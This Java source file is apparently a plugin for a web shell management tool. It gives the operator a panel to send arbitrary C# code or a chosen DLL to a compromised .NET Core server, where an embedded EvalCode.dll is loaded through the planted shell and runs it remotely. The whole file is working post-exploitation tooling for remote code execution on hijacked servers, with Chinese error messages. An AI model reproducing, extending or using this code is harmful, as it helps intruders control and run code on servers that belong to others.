package shells.plugins.netcore;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
        payloadName = "NetCoreDynamicPayload",
        Name = "EvalCode",
        DisplayName = "\u4ee3\u7801\u6267\u884c"
)
public class NEvalCode implements Plugin {
    private static final String CLASS_NAME = "Run";
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;
    private boolean loadState;
    private final JPanel panel = new JPanel(new BorderLayout());
    private final RTextArea codeTextArea = new RTextArea();
    private final RTextArea resultTextArea = new RTextArea();
    private final JButton runCodeButton = new JButton("Run C# Code");
    private final JButton runDllButton = new JButton("Run C# DLL");
    private final JTextField typeNameTextField = new JTextField("CustomClassName", 20);
    private final JTextField dllPathTextField = new JTextField(30);
    private final JButton chooseDllButton = new JButton("...");

    public NEvalCode() {
        this.codeTextArea.setText(
                "\nusing System;\nusing System.Collections;\nusing System.IO;\nusing System.Text;\n\n"
                        + "public class CustomClassName\n{\n\tpublic CustomClassName(){}\n\n"
                        + "\tstring Run()\n\t{\n\t\treturn \"Hello NetCore!\";\n\t}\n\n"
                        + "\tpublic override string ToString()\n\t{\n\t\treturn Run();\n\t}\n}\n");
        JPanel top = new JPanel();
        top.add(new JLabel("TypeName:"));
        top.add(this.typeNameTextField);
        top.add(this.runCodeButton);
        top.add(new JLabel("DLL Path:"));
        top.add(this.dllPathTextField);
        top.add(this.chooseDllButton);
        top.add(this.runDllButton);
        JSplitPane split = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        split.setTopComponent(new JScrollPane(this.codeTextArea));
        split.setBottomComponent(new JScrollPane(this.resultTextArea));
        split.setDividerLocation(280);
        this.panel.add(top, BorderLayout.NORTH);
        this.panel.add(split, BorderLayout.CENTER);
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    private boolean load() {
        if (!this.loadState) {
            this.loadState = this.payload.include(CLASS_NAME,
                    functions.readInputStreamAutoClose(NEvalCode.class.getResourceAsStream("assets/EvalCode.dll")));
        }
        return this.loadState;
    }

    public void runCodeButtonClick(ActionEvent e) {
        try {
            if (!this.load()) {
                this.resultTextArea.setText("\u52a0\u8f7d\u63d2\u4ef6\u5931\u8d25");
                return;
            }
            String code = this.codeTextArea.getText();
            String typeName = this.typeNameTextField.getText().trim();
            if (typeName.length() == 0) {
                this.resultTextArea.setText("class name is empty");
                return;
            }
            ReqParameter p = new ReqParameter();
            p.add("codeBytes", code.getBytes("UTF-8"));
            p.add("FullTypeName", typeName);
            byte[] r = this.payload.evalFunc(CLASS_NAME, "run", p);
            this.resultTextArea.setText(this.encoding.Decoding(r));
        } catch (Throwable t) {
            this.resultTextArea.setText(String.format("\u8fd0\u884c\u65f6\u53d1\u751f\u5f02\u5e38 \u4fe1\u606f:%s", t.getMessage()));
            Log.error(t);
        }
    }

    public void runDllButtonClick(ActionEvent e) {
        try {
            if (!this.load()) {
                this.resultTextArea.setText("\u52a0\u8f7d\u63d2\u4ef6\u5931\u8d25");
                return;
            }
            String path = this.dllPathTextField.getText().trim();
            if (path.length() == 0) {
                JOptionPane.showMessageDialog(this.panel, "\u672a\u9009\u62e9DLL\u6587\u4ef6\u8def\u5f84", "\u63d0\u793a", 2);
                return;
            }
            File f = new File(path);
            if (!f.isFile()) {
                JOptionPane.showMessageDialog(this.panel, "\u65e0\u6548DLL\u6587\u4ef6\u8def\u5f84", "\u63d0\u793a", 2);
                return;
            }
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            FileInputStream fis = new FileInputStream(f);
            byte[] buf = new byte[4096];
            int n;
            while ((n = fis.read(buf)) > 0) bos.write(buf, 0, n);
            fis.close();
            ReqParameter p = ReqParameter.createInvokeMethodReqParameter();
            p.add("dllBytes", bos.toByteArray());
            p.add("FullTypeName", this.typeNameTextField.getText().trim());
            byte[] r = this.payload.evalFunc(CLASS_NAME, "run", p);
            this.resultTextArea.setText(this.encoding.Decoding(r));
        } catch (Throwable t) {
            this.resultTextArea.setText(String.format("\u8fd0\u884c\u65f6\u53d1\u751f\u5f02\u5e38 \u4fe1\u606f:%s", t.getMessage()));
            Log.error(t);
        }
    }

    public void chooseDllButtonClick(ActionEvent e) {
        try {
            javax.swing.JFileChooser chooser = new javax.swing.JFileChooser();
            if (chooser.showOpenDialog(this.panel) == javax.swing.JFileChooser.APPROVE_OPTION) {
                this.dllPathTextField.setText(chooser.getSelectedFile().getAbsolutePath());
            }
        } catch (Throwable t) {
            Log.error(t);
        }
    }

    public JPanel getView() {
        return this.panel;
    }
}
